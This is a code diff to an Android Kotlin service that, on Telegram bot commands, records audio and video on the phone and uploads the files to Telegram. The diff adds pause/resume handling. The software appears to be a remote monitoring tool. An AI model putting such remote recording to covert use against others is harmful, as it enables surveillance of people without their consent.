@@ -4236,6 +4236,10 @@ class MonitoringService : Service() {
 
 
     private suspend fun handleRecordCommand(arg: String) {
+        if (preferencesManager.monitoringPaused) {
+            sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
+            return
+        }
         val seconds = arg.toIntOrNull()
         if (seconds == null || seconds !in 5..600) {
             sendToTelegram("Cara pakai: /record &lt;5-600&gt; (detik)")
@@ -4262,6 +4266,10 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleRecordVideoCommand(arg: String) {
+        if (preferencesManager.monitoringPaused) {
+            sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
+            return
+        }
         val seconds = arg.toIntOrNull()
         if (seconds == null || seconds !in 5..MAX_VIDEO_SECONDS.toInt()) {
             sendToTelegram("Cara pakai: /recordvideo &lt;5-$MAX_VIDEO_SECONDS&gt; (seconds)")
@@ -9787,6 +9795,15 @@ class MonitoringService : Service() {
                 return
             }
             recorderActive.set(false)
+            if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
+                keepForRetry = true
+                audioOutcome = MediaSendOutcome.KEPT
+                try {
+                    sendToTelegram("⏸️ Monitoring dijeda — rekaman disimpan, dikirim sesudah /resume.")
+                } catch (_: Exception) {
+                }
+                return
+            }
             val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(AUDIO_UPLOAD_TIMEOUT_MS) { sendAudioFile(audioFile) }
             if (uploadOutcome == null) {
                 keepForRetry = true
@@ -10044,7 +10061,9 @@ class MonitoringService : Service() {
                     markMediaActive(videoFile)
                     serviceScope.launch {
                         try {
-                            if (videoFile.length() > MAX_VIDEO_BYTES) {
+                            if (try { preferencesManager.monitoringPaused } catch (_: Exception) { false }) {
+                                sendToTelegram("⏸️ Monitoring dijeda — video disimpan, dikirim sesudah /resume.")
+                            } else if (videoFile.length() > MAX_VIDEO_BYTES) {
                                 deleteQuietly(videoFile)
                                 sendToTelegram("⚠️ Video terlalu besar (>${MAX_VIDEO_BYTES / (1024L * 1024L)} MB). Coba /recordvideo dengan detik lebih sedikit.")
                             } else {
